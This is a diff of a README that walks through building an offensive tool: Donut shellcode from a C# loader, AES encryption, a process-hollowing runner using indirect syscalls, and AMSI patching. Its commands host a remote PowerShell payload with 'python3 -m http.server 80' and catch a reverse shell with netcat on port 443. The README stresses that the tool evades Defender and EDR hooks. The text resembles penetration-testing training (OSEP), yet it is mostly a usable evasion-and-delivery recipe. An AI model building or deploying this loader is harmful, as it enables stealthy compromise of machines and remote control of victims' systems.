@@ -7,7 +7,7 @@ This project demonstrates a stealthy end-to-end technique to execute an AES-encr
 - **Donut Shellcode Generator**
 - **.NET AMSI Bypass**
 - **Indirect Syscalls**
-- **PPID Spoofing (optional)**
+- **PPID Spoofing (not implemented, but supported)**
 
 Tested in OSEP-like environments with **Windows Defender enabled**.
 
@@ -15,8 +15,11 @@ Tested in OSEP-like environments with **Windows Defender enabled**.
 
 ## 🧩 Step 1: Build the PowerShell Loader
 
-- The C# loader (Loader.cs) patches AMSI via `.NET Reflection`, downloads a remote PowerShell payload, and executes it in memory using `Runspace`.
+- The C# loader (`Loader.cs`) patches AMSI via `.NET Reflection`, downloads a remote PowerShell payload, and executes it in memory using `Runspace`.
 - Uses base64 string obfuscation for script names like `shell.ps1`.
+
+📌 **Important:**  
+Make sure the hardcoded IP in `Loader.exe` **matches the IP of the machine hosting `shell.ps1`** via HTTP.
 
 📌 **Note:** You may need to reference:
 ```
@@ -27,7 +30,7 @@ C:\Program Files\WindowsPowerShell\Modules\PowerShellGet\<version>\System.Manage
 
 ## 🧪 Step 2: Generate Shellcode with Donut
 
-Convert the compiled `Loader.exe` into raw shellcode with `donut`:
+Convert the compiled `Loader.exe` into raw shellcode using [Donut](https://github.com/TheWover/donut):
 
 ```bash
 donut.exe -i Loader.exe -a 2 -f 1 -b 1 -o shellcode.bin
@@ -36,12 +39,13 @@ donut.exe -i Loader.exe -a 2 -f 1 -b 1 -o shellcode.bin
 **Explanation of Donut flags:**
 - `-a 2`: Target architecture (x64)
 - `-f 1`: Output format: raw shellcode
-- `-b 1`: Enable AMSI/WLDP/ETW bypass with fallback  
+- `-b 1`: AMSI/WLDP/ETW bypass level  
   - `1`: **No bypass**  
   - `2`: Abort on failure  
-  - `3`: Continue on failure 
+  - `3`: Continue on failure
 
-* I use donut in my Windows host an then transfer to kali linux to encrypt the shellcode.bin file.
+💡 *This project uses Donut on Windows and then transfers `shellcode.bin` to a Kali Linux host for encryption.*
+
 ---
 
 ## 🔐 Step 3: Encrypt the Shellcode with AES
@@ -52,7 +56,7 @@ Use the provided Python script to encrypt the shellcode using AES-256-CBC:
 python3 Aes_encryption.py
 ```
 
-- The script generates `encryptedShellcode`, `aesKey`, and `aesIV` as C#-formatted byte arrays.
+- The script outputs `encryptedShellcode`, `aesKey`, and `aesIV` as C# byte arrays.
 - Paste these into the `Advanced_Process_Hollowing.cs` runner.
 
 ---
@@ -68,9 +72,9 @@ The shellcode runner performs the following:
 - Sets memory protection to `RX` using `NtProtectVirtualMemory`
 - Launches a thread using `NtCreateThreadEx` (indirect syscall)
 
-✅ All syscalls are performed using dynamically allocated stubs copied directly from `ntdll.dll`, bypassing userland hooks from AV/EDR.
+✅ All syscalls are performed using dynamically allocated stubs from `ntdll.dll`, bypassing userland API hooks from AV/EDR.
 
-✅ PPID spoofing support can be added for stealthier process lineage.
+❌ **PPID Spoofing is not implemented in this version**, although the use of `STARTUPINFOEX` structure means it could be added in the future.
 
 ---
 
@@ -78,7 +82,10 @@ The shellcode runner performs the following:
 
 Create a `shell.ps1` PowerShell script containing your reverse shell logic.
 
-Then host it using a simple HTTP server:
+📌 **Important:**  
+Ensure that the IP inside `shell.ps1` (e.g. `TCPClient('192.168.1.X', 443)`) **matches the IP of your listener machine**.
+
+Then serve the file using Python:
 
 ```bash
 python3 -m http.server 80
@@ -98,23 +105,24 @@ rlwrap -cAr nc -lnvp 443
 
 ## 🚀 Step 7: Run the Shellcode Runner
 
-Once everything is set:
+Once everything is set up, run the compiled runner:
 
 ```bash
 .\Advanced_Process_Hollowing.exe
 ```
 
-If successful, your listener will receive the reverse shell.
+If successful, your listener will receive the reverse shell connection.
 
 ---
 
 ## ✅ Summary
 
-- AMSI is bypassed silently at runtime via .NET Reflection
-- Shellcode is encrypted with AES and decrypted just-in-time
-- Execution flow uses indirect syscalls to evade userland hooks
-- Shellcode loads a PowerShell loader that fetches and runs a remote payload
-- Designed for stealth and tested in real-world offensive scenarios
+- AMSI is patched via .NET Reflection
+- AES-encrypted shellcode is decrypted and injected into a remote process
+- Full execution is achieved via indirect syscalls to evade detection
+- The shellcode loads a PowerShell loader that fetches and executes a remote payload
+- Designed for stealth and tested in Defender-enabled environments
+- PPID Spoofing is not yet implemented, but possible with minimal modification
 
 ---
 
